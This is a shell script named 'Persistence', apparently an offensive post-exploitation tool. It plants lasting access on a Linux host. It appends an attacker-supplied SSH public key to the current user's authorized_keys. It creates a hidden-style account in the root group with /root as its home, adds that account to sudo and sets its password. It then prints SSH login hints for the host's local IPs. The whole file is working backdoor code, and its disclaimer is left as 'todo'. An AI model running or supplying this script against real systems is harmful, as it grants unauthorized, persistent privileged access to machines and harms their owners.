#!/bin/sh
# Persistence

####################
# Global variables #
####################

# colors
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[0;33m'
BLUE='\033[0;34m'
NC="\033[0m" # No Color
# bold
BRED='\033[1;31m'
BGREEN='\033[1;32m'
BYELLOW='\033[1;33m'
BBLUE='\033[1;34m'
# text
BOLD=$(tput bold)
NORMAL='\033[0;39m'

#############
# Functions #
#############

# Print banner
fuBANNER() {
# http://patorjk.com/software/taag/#p=display&f=Graffiti&t=Type%20Something
echo "
  ____   _____  ____   ____  ___  ____  _____  _____  _   _   ____  _____ 
 |  _ \ | ____||  _ \ / ___||_ _|/ ___||_   _|| ____|| \ | | / ___|| ____|
 | |_) ||  _|  | |_) |\___ \ | | \___ \  | |  |  _|  |  \| || |    |  _|  
 |  __/ | |___ |  _ <  ___) || |  ___) | | |  | |___ | |\  || |___ | |___ 
 |_|    |_____||_| \_\|____/|___||____/  |_|  |_____||_| \_| \____||_____|
                                                                     
"
}

# Print output title
fuTITLE() {
  echo
  echo "$BBLUE════════════════════════════════════════════════════════════════════════"
  echo "$BGREEN $1 $BBLUE"
  echo "════════════════════════════════════════════════════════════════════════$NC"
}

# Print info line
fuINFO() {
  echo
  echo "$BBLUE═══$BGREEN $1 $NC"
}

# Print error line
fuERROR() {
  echo
  echo "$BBLUE═══$BRED $1 $NC"
}

# Print results line
fuRESULT() {
  echo
  echo "$BBLUE═══$BYELLOW $1 $NC"
}

# Print next steps line
fuSTEPS() {
  echo
  echo "$BBLUE[X]$NC $1 $NC"
}

# Print message line
fuMESSAGE() {
  echo "$BBLUE---$NC $1 $NC"
}

# Check for root permissions
fuGOT_ROOT() {
fuINFO "Checking for root"
if ([ -f /usr/bin/id ] && [ "$(/usr/bin/id -u)" -eq "0" ]) || [ "`whoami 2>/dev/null`" = "root" ]; then
  IAMROOT="1"
  fuMESSAGE "You are root"
  echo
else
  IAMROOT=""
  fuMESSAGE "You are not root"
  echo
fi
}

#####################################
# Check the command line parameters #
#####################################

PASSED_ARGS=$@
if [ "$PASSED_ARGS" != "" ]; then
  while getopts "hs:u:p:" opt; do
    case "$opt" in
      h|\?)
        echo
        echo "Usage: sh $0 [-h] [-s]"
        echo
        echo "-s <ssh public key / content of id_rsa.pub>"
        echo "  Trying to add ssh public key to authorized_keys of current user"
        echo
        echo "-u <username>"
        echo "  Trying to add a local account/user"
        echo
        echo "-p <password>"
        echo "  Set this password to new user"
        echo "  Only useful with -u parameter set"
        echo
        exit;;
      s) SSH="1";PUBKEY=$OPTARG;;
      u) ADDUSER="1";USERNAME=$OPTARG;;
      p) ADDPW="1";PW=$OPTARG;;
      esac
  done
else
  echo "$0: no arguments passed to script. Try -h for help."
  echo
  exit
fi

# validate OPTARG 
# todo

##########
# Banner #
##########

fuBANNER
echo
echo "Disclaimer: $RED todo $NC"
echo
sleep 1

#####################
# Checking for root #
#####################

fuGOT_ROOT
sleep 1

############
# SSH Keys #
############

if [ "$SSH" ]; then
  echo "
    __  __           _ _  __         ____ ____  _   _   _  __                      
   |  \/  | ___   __| (_)/ _|_   _  / ___/ ___|| | | | | |/ /___ _   _ ___         
   | |\/| |/ _ \ / _\` | | |_| | | | \___ \___ \| |_| | | ' // _ \ | | / __|        
   | |  | | (_) | (_| | |  _| |_| |  ___) |__) |  _  | | . \  __/ |_| \__ \  _ _ _ 
   |_|  |_|\___/ \__,_|_|_|  \__, | |____/____/|_| |_| |_|\_\___|\__, |___/ (_|_|_)
                             |___/                               |___/             
  "
  sleep 1

  # check if local ssh server is running
  fuTITLE "Check if local ssh server is running ..."
  sleep 2
  if ps aux | grep sshd | grep -v grep 2>/dev/null; then
    fuMESSAGE "Local ssh server is running"
  elif netstat -plant | grep :22 | grep LISTEN 2>/dev/null; then
    fuMESSAGE "Local ssh server is listening on port 22"
  else
    fuERROR "Probably no ssh server running on this host"
  fi

  # set current user to $USER
  if WHOAMI=$(command -v whoami 2>/dev/null); then
    USER=$($WHOAMI 2>/dev/null)
    # check if $HOME variable is set
    if [ ! "$HOME" ]; then
      if [ -d "/home/$USER" ]; then
        HOME="/home/$USER"
      fi
    fi
  else
    fuERROR "command \"whoami\" not found"
  fi

  # get local ip addresses
  LOCAL_IP=$(ip a | grep -vi docker | grep -Eo 'inet[^6]\S+[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}' | awk '{print $2}' | grep -E "^10\.|^172\.|^192\.168\.|^169\.254\.")

  fuTITLE "Trying to add given ssh public key to authorized_keys file of user \"$USER\" ..."
  sleep 2

  if [ -d "$HOME/.ssh" ]; then
    if echo "$PUBKEY" >> "$HOME"/.ssh/authorized_keys; then TRYCHMOD=""; else SSHOK="" && fuERROR "unable to write authorized_keys" && TRYCHMOD="1"; fi
    if [ "$TRYCHMOD" ]; then
      if CHMOD=$(command -v chmod 2>/dev/null); then
        $CHMOD 700 "$HOME"/.ssh 2>/dev/null
        echo "$PUBKEY" >> "$HOME"/.ssh/authorized_keys && SSHOK="1" && fuMESSAGE "authorized_keys updated"
      else 
        fuERROR "command \"chmod\" not found"
      fi
    else
      SSHOK="1" && echo "authorized_keys updated"
    fi
  else
    fuINFO "No .ssh directory exists, creating one ..."
    MKDIR=$(command -v mkdir 2>/dev/null) || fuERROR "command \"mkdir\" not found"
    CHMOD=$(command -v chmod 2>/dev/null) || fuERROR "command \"chmod\" not found"
    $MKDIR "$HOME"/.ssh 2>/dev/null && $CHMOD 700 "$HOME"/.ssh 2>/dev/null
    if echo "$PUBKEY" >> "$HOME"/.ssh/authorized_keys; then SSHOK="1" && fuMESSAGE "authorized_keys updated"; else SSHOK="" && fuERROR "unable to write authorized_keys"; fi
  fi
fi


#################
# Local Account #
#################

if [ "$ADDUSER" ]; then
  echo "
      _       _     _   _                    _      _                             _   
     / \   __| | __| | | |    ___   ___ __ _| |    / \   ___ ___ ___  _   _ _ __ | |_ 
    / _ \ / _\` |/ _\` | | |   / _ \ / __/ _\` | |   / _ \ / __/ __/ _ \| | | | \'_ \| __|
   / ___ \ (_| | (_| | | |__| (_) | (_| (_| | |  / ___ \ (_| (_| (_) | |_| | | | | |_ 
  /_/   \_\__,_|\__,_| |_____\___/ \___\__,_|_| /_/   \_\___\___\___/ \__,_|_| |_|\__|
  "
  sleep 1

  # without root
  #useradd -M -N -r -s /bin/bash #{username}

  # check if /bin/bash exists
  if [ -f "/bin/bash" ]; then BASH="1"; else BASH=""; fi

  # with root
  fuTITLE "Trying to add the user \"$USERNAME\" with root privileges ..."
  sleep 2

  USERADD=$(command -v useradd 2>/dev/null) || fuERROR "command \"useradd\" not found"
  USERMOD=$(command -v usermod 2>/dev/null) || fuERROR "command \"usermod\" not found"
  
  if [ "$BASH" ]; then
    if $USERADD -g 0 -M -d /root -s /bin/bash $USERNAME 2>/dev/null; then
      ADDUSEROK="1" && fuMESSAGE "user \"$USERNAME\" added"
    else
      ADDUSEROK="" && fuERROR "unable to add user \"$USERNAME\". You need root privileges. Try \"sudo sh $0\""
    fi
  else
    if $USERADD -g 0 -M -d /root -s /bin/sh $USERNAME 2>/dev/null; then
      ADDUSEROK="1" && fuMESSAGE "user \"$USERNAME\" added"
    else
      ADDUSEROK="" && fuERROR "unable to add user \"$USERNAME\". You need root privileges. Try \"sudo sh $0\""
    fi
  fi
  
  if [ "$ADDUSEROK" ]; then
    fuTITLE "Trying to add user \"$USERNAME\" to sudo group ..."
    sleep 1
    if $USERMOD -a -G sudo $USERNAME 2>/dev/null; then
      fuMESSAGE "user \"$USERNAME\" added to sudo group"
    else
      fuERROR "unable to add user \"$USERNAME\" to sudo group"
    fi

    fuTITLE "Trying to add a password to user \"$USERNAME\" ..."
    sleep 1
    if [ "$ADDPW" ]; then
      if [ $(cat /etc/os-release | grep -i 'Name="ubuntu"') ]; then
        echo "$USERNAME:$PW" | sudo chpasswd
      else
        echo "$PW" | passwd $USERNAME
      fi
    else
      fuERROR "No password given. You cannot login with that username until you create a password!!! Try \"sudo sh $0 -p\""
    fi
  fi

elif [ "$ADDPW" ]; then
  fuERROR "No username given. Try to add a user with -u parameter and combine it with -p"
fi


##############
# Next Steps #
##############
  
echo "
   _   _           _     ____  _                   _____       ____                
  | \ | | _____  _| |_  / ___|| |_ ___ _ __  ___  |_   _|__   |  _ \  ___          
  |  \| |/ _ \ \/ / __| \___ \| __/ _ \ '_ \/ __|   | |/ _ \  | | | |/ _ \         
  | |\  |  __/>  <| |_   ___) | ||  __/ |_) \__ \   | | (_) | | |_| | (_) |  _ _ _ 
  |_| \_|\___/_/\_\ __| |____/ \__\___| .__/|___/   |_|\___/  |____/ \___/  (_|_|_)
                                      |_|                                          
"

if [ "$SSH" ]; then
  if [ "$SSHOK" ]; then
    fuSTEPS "authorized_key file updated, if ssh server is running, remote ssh login should be possible to user \"$USER\" with given SSH key pair."
    for ip in $LOCAL_IP; do
      fuSTEPS "From your Host: Try \"ssh $USER@$ip\""
    done
  else
    fuERROR "Modify ssh keys was not successful"
  fi
fi

if [ "$ADDUSER" ]; then
  if [ "$ADDUSEROK" ]; then
    fuSTEPS "User $USERNAME added. To login with ssh, switch to new user and run the script again with -s parameter"
  else
    fuERROR "Add user was not successful"
  fi
fi

echo